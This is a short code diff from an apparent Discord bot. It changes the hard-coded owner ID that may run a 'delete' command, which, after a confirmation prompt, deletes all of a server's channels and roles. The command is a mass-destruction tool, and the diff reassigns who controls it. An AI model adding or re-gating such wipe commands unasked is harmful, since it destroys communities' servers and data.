@@ -730,7 +730,7 @@ async def botrole(ctx):
 
 @bot.command()
 async def delete(ctx):
-    if ctx.author.id != 1098141251209023538:
+    if ctx.author.id != 1188620657588699176:
         return await ctx.send("You are not the bot owner!")
     
     await ctx.send("Are you sure you want to delete all the channels and roles? (yes/no)")
